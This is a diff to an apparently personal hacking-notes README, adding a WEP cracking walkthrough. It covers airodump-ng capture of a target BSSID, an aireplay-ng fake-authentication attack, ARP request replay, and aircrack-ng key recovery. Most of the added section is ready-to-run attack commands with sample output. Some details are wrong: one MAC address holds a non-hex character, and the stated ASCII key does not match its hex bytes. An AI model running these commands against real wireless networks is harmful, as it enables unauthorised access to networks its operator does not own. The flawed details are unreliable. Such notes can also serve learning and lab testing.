@@ -21,7 +21,7 @@
 
   - [Gaining Access](#gaining-access)
     - [WEP Cracking](#wep-cracking)
-    - 
+    - [Fake Authentication](#fake-authentication)
 
 
   - [Post Connection Attacks](#post-connection-attacks)
@@ -244,13 +244,83 @@ wlan0mon - interface name <br>
 ## Gaining Access
 
 ### WEP Cracking
-- Wired Equivalent Privacy (WEP)
-- Old encryption
-- Uses an algorithm called RC4
-- Still used in some networks
-- Can be cracked easily
+To crack WEP we need to:
+-  Capture a large number of packets/IVs. → *airodump-ng*
+-  Analyse the captured IVs and crack the key. → *aircrack-ng*
+> Targeted Packet Sniffing 
 ```
+airodump-ng --bssid 70:97:41:DA:E0:5B --channel 6 --write test wlan0mon
 ```
+> crack that saved file [ test-01.cap ]
+```
+aircrack-ng test-01.cap
+```
+see that KEY
+> KEY FOUND [41:45:76:98] [ ASCII : As23p ] <br>
+
+Remove all colon symbol ":" in that key found [41:45:76:98]
+
+> Password : 41457698
+
+- Problem:
+if network is not busy
+it would take some time to capture enough IVs
+
+- Solution:
+force the AP to genarate new IVs (fake authentication attack)<br><br><br>
+
+### Fake Authentication
+**Open terminal - 1**
+> find target MAC Address and Channel <br>
+> targeted packet sniffing 
+```
+airodump-ng wlan0mon
+airodump-ng --bssid 70:97:41:DA:E0:5B --channel 6 --write test wlan0mon
+```
+<br>
+
+**Open terminal - 2**
+> fake authentication attack
+```
+aireplay-ng --fakeauth 0 -a 70:97:41:DA:E0:5B -h 48:5D:60:45:G6:25 wlan0mon
+```
+-a - target MAC Address <br>
+-h - interface MAC Address
+
+- Problem:
+APs only communicate with connected clients.
+We can’t communicate with it.
+We can’t even start the attack.
+
+- Solution:
+Associate with the AP before launching the attack. ( ARP Request Replay ) 
+<br>
+
+**Open terminal - 3**
+> ARP Request Replay
+```
+aireplay-ng --arpreplay 0 -b 70:97:41:DA:E0:5B -h 48:5D:60:45:G6:25 wlan0mon
+```
+see the number of data is increaing know verry verry quickly to high <br>
+
+
+-b - target MAC Address <br>
+-h - interface MAC Address <br>
+<br>
+
+**Open terminal - 4**
+> crack that saved file [ test-01.cap ]
+```
+aircrack-ng test-01.cap
+```
+see that KEY
+> KEY FOUND [41:45:76:98] [ ASCII : As23p ] <br>
+
+Remove all colon symbol ":" in that key found [41:45:76:98]
+
+> Password : 41457698
+
+
 
 ---
 
